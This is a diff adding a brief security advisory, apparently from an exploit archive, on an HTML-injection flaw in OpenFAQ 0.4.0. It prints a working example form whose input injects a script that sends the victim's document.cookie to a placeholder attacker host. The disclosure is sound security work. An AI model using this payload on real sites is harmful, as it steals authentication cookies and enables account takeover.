@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/17860/info
+
+OpenFAQ is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Example exploit: <form action=http://host/openfaq-0.4.0/submit.php?ask=go method=post> <input type=text name=q value="<SCRIPT>document.location='http://attacker.com/get.cgi? value='+escape(document.cookie)</SCRIPT>"> <input type=hidden name=email> <input type=submit value=Submit> </form>
